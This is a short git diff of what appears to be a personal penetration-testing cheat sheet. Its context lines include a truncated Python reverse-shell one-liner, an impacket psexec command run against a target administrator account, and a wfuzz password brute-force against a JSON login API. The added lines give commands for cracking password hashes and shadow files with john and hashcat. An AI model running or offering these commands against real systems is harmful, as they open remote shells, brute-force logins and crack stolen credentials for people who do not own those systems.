@@ -42,6 +42,13 @@ sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socke
     #some tools of impacket, can be used like
       python3 psexec.py administrator@{TARGET_IP} # after we got the psswd and id
 
-### wfuzz to bruteforce api-web login
+#### wfuzz to bruteforce api-web login
   wfuzz -d '{"id":"xxxx", "passwd":"FUZZ"}' -sc 200 -H 'Content-Type: application/json' -w passwd.txt $url
 
+#### john
+sudo john --wordlist=xxx targetfile
+...
+sudo john -show shadow  //to view the result
+
+#### hashcat
+  hashcat -a 0 -m xxx hash.txt wordl.txt
